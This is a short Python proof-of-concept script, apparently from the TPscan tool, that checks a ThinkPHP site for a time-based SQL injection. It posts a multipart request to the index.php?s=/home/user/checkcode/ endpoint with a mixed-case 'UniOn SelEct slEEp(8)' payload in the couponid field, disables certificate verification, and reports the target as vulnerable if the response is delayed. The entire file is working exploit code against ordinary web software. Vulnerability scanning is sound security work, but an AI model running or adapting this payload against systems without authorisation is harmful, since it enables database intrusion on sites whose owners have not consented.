#!/usr/bin/env python
# coding=utf-8
import time
import urllib
import requests
import urllib3
urllib3.disable_warnings()

def thinkphp_checkcode_time_sqli_verify(url):
    pocdict = {
        "vulnname":"thinkphp_checkcode_time_sqli",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        "response":"",
        "exception":"",
    }
    headers = {
        "User-Agent" : "TPscan",
        "DNT": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Content-Type": "multipart/form-data; boundary=--------641902708",
        "Accept-Encoding": "gzip, deflate, sdch",
        "Accept-Language": "zh-CN,zh;q=0.8",
    }
    payload = "----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(8)#\r\n\r\n----------641902708--"
    try:
        start_time = time.time()
        vurl = urllib.parse.urljoin(url, 'index.php?s=/home/user/checkcode/')
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
        if time.time() - start_time >= 8:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['payload'] = payload
            pocdict['proof'] = 'time sleep 8'
            pocdict['response'] = req.text
            print(pocdict)

    except:
        pass
